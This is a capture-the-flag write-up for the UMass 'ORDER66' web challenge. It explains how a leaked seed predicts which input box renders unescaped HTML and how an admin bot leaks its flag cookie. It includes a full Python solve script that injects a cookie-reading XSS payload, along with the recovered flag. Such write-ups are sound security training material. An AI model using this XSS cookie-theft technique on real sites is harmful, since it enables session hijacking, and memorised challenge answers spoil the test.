# ORDER66 (web, 352) - Writeup

## Challenge
- Name: ORDER66
- Category: web
- Difficulty: easy
- Author: lordbravenick
- Prompt: See if you can figure out what order to execute...
- URL: http://order66.web.ctf.umasscybersec.org:48001/

## Goal
Get the admin bot to leak the `flag` cookie.

## High-level idea
The app has a single reflected/stored XSS sink among 66 boxes, and the vulnerable box index is deterministic from a leaked `seed` value.

Flow:
1. Parse `uid` and `seed` from share URL (`/view/<uid>/<seed>`).
2. Recompute vulnerable box index with Python `random.seed(seed); randint(1,66)`.
3. Store `<script>console.log(document.cookie)</script>` in that exact box.
4. Trigger `/admin/visit` with a target URL that uses host `web`.
5. Bot sets `flag` cookie for domain `web`, visits internal translated URL `web:<PORT>`, XSS runs, console logs cookie.
6. `/admin/visit` returns bot stdout, including `flag=UMASS{...}`.

## Vulnerability details

### 1) Deterministic vulnerable slot
In server logic:
- `v_index = random.randint(1, 66)` after `random.seed(seed)`.
- Only this slot is rendered with `|safe`.

So if `seed` is known, vuln index is exactly predictable.

### 2) Seed leak via share URL
The page exposes:
- `http://{{ host }}/view/{{ user_id }}/{{ seed }}`

This leaks both `uid` and `seed` needed to target the precise XSS slot.

### 3) Bot cookie-domain behavior
Bot code sets:
- cookie name: `flag`
- cookie domain: `parsedUrl.hostname` from attacker-controlled `target_url`

`/admin/visit` then rewrites netloc to internal `web:<PORT>` and launches puppeteer there.
If attacker supplies `target_url` with host `web`, cookie domain matches bot-visited host and is sent.

### 4) Console-to-response leak
Node bot forwards `console.log` output to process stdout.
Flask `/admin/visit` returns `process.stdout` directly.
So `console.log(document.cookie)` becomes visible to attacker.

## Step-by-step exploit

### 1) Load challenge page and parse seed
Read `/`, regex parse `/view/<uid>/<seed>`.

### 2) Compute vuln index
Use Python random with same seed.

### 3) Inject payload in exactly one box
Submit only `box_<vuln_idx>` with script payload.

### 4) Trigger admin bot
POST `/admin/visit` with:
- `target_url=http://web/view/<uid>/<seed>`

### 5) Extract flag from response
Regex `flag=...` in bot output.

## Full solve script (copy-paste)
```python
import re, random, requests

BASE='http://order66.web.ctf.umasscybersec.org:48001'
s=requests.Session()

r=s.get(BASE+'/',timeout=15)
html=r.text
m=re.search(r'/view/([0-9a-f\-]+)/([0-9]+)', html)
if not m:
    print('failed_parse_uid_seed')
    print(html[:500])
    raise SystemExit(1)
uid,seed=m.group(1),int(m.group(2))

random.seed(seed)
vuln_idx=random.randint(1,66)
print('uid',uid)
print('seed',seed)
print('vuln_idx',vuln_idx)

payload='<script>console.log(document.cookie)</script>'
post_data={f'box_{vuln_idx}':payload}
r2=s.post(BASE+'/',data=post_data,timeout=15)
print('inject_status',r2.status_code)

visit_url=f'http://web/view/{uid}/{seed}'
r3=s.post(BASE+'/admin/visit',data={'target_url':visit_url},timeout=30)
print('visit_status',r3.status_code)
print('---BOT OUTPUT START---')
print(r3.text)
print('---BOT OUTPUT END---')

mflag=re.search(r'flag=([^;\s]+)', r3.text)
if mflag:
    print('FLAG',mflag.group(1))
else:
    print('NO_FLAG_FOUND')
```

## Result
Recovered flag:

```text
UMASS{m@7_t53_f0rce_b$_w!th_y8u}
```

## Why this challenge is "order"
The title hint points to finding the correct execution order:
- first compute correct box index,
- then inject,
- then trigger admin visit under correct host domain,
- then read console leak.

If sequence is wrong, exploit fails.
